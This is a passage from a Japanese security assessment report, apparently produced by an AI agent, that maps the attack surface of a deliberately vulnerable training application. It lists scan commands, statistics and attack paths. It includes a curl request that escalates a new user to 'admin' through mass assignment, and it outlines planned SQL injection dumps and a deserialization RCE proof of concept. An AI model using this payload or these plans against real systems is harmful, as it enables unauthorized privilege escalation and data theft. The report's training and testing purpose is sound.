3. **カスタムスクリプト** - Mass Assignment検証
   ```bash
   curl -X POST http://api:5000/api/users \
     -H "Content-Type: application/json" \
     -d '{"username":"hacker","email":"h@c.com","password":"p","role":"admin"}'
   ```

4. **OWASP ZAP** - XSS・ディレクトリトラバーサル検証
   ```bash
   zap-cli quick-scan http://frontend:80
   zap-cli active-scan http://api:5000
   ```

#### 優先度2: High脆弱性の検証

1. **Nikto** - Webサーバー設定検査
2. **Trivy** - コンテナイメージ脆弱性スキャン
3. **手動テスト** - デシリアライズRCE検証

### 8.2 エクスプロイトフェーズ（フェーズ04）での実証項目

1. SQLインジェクションによる全データダンプ
2. 管理者権限不正取得のデモンストレーション
3. RCE脆弱性のPoC作成
4. データベース直接侵入のシナリオ実証

### 8.3 レポーティングフェーズ（フェーズ05）での報告内容

- 24個の脆弱性の詳細レポート
- リスク評価マトリクス
- 修正優先度付きロードマップ
- 再発防止策（セキュアコーディングガイドライン）

---

## 9. 統計サマリー

### 9.1 脆弱性統計

| 重大度 | 件数 | 割合 | 平均CVSS（推定） |
|--------|------|------|-----------------|
| Critical | 12 | 50% | 9.0-10.0 |
| High | 8 | 33% | 7.0-8.9 |
| Medium | 4 | 17% | 4.0-6.9 |
| **合計** | **24** | **100%** | **7.8** |

### 9.2 OWASP Top 10 カバレッジ

| カテゴリ | 該当脆弱性数 | カバー率 |
|---------|------------|---------|
| A01 - Broken Access Control | 3 | ✅ 100% |
| A02 - Cryptographic Failures | 4 | ✅ 100% |
| A03 - Injection | 5 | ✅ 100% |
| A04 - Insecure Design | 4 | ✅ 100% |
| A05 - Security Misconfiguration | 5 | ✅ 100% |
| A06 - Vulnerable Components | 1 | ⚠️ 部分的 |
| A07 - Auth Failures | 5 | ✅ 100% |
| A08 - Data Integrity Failures | 3 | ✅ 100% |
| A09 - Logging Failures | 3 | ✅ 100% |
| A10 - SSRF | 2 | ⚠️ 部分的 |

**カバー率**: 9/10カテゴリ（90%）

### 9.3 攻撃ベクトル統計

| 攻撃ベクトル | 脆弱性数 | 例 |
|------------|---------|-----|
| **ネットワーク経由** | 18 | SQLi, XSS, RCE, etc. |
| **ローカル（コンテナ内）** | 6 | root権限実行, etc. |
| **物理アクセス不要** | 24 | 全て |

**結論**: 全脆弱性がリモートから攻撃可能

---

## 10. 結論

### 10.1 総合評価

このアプリケーションは**意図的に脆弱性を組み込んだ教育用環境**であり、以下の特徴があります:

✅ **OWASP Top 10の包括的なカバレッジ** - 9/10カテゴリを網羅  
✅ **多層的な攻撃面** - ネットワーク層からアプリケーション層まで  
✅ **Critical脆弱性の密度が高い** - 50%がCritical評価  
✅ **実践的な攻撃シナリオ構築が可能** - 複合的な攻撃経路が存在  

⚠️ **本番環境では絶対に使用不可** - セキュリティ対策が一切施されていない

### 10.2 主要な攻撃経路

```
攻撃者
  ├─ 経路1: DB直接アクセス (localhost:15432) → 即座に全データ取得
  ├─ 経路2: SQLインジェクション (全API) → 認証バイパス・データ改ざん
  ├─ 経路3: Mass Assignment → 管理者権限不正取得
  ├─ 経路4: RCE (デシリアライズ) → サーバー完全侵害
  └─ 経路5: XSS → ユーザーセッション乗っ取り
```

### 10.3 次フェーズの焦点

1. **SQLインジェクションの実証** - 自動化ツール（sqlmap）での検証
2. **認証バイパス** - 全エンドポイントへの無制限アクセス検証
3. **RCE脆弱性** - TypeNameHandling悪用のPoC作成
4. **複合攻撃シナリオ** - SQLi → Mass Assignment → データベース侵害

---

**次フェーズ**: `03-scanning.agent.md`（脆弱性スキャニング）へ進む

**レポート作成者**: Attack Surface Mapping Agent  
**完了日時**: 2026-02-08 09:30:00 UTC
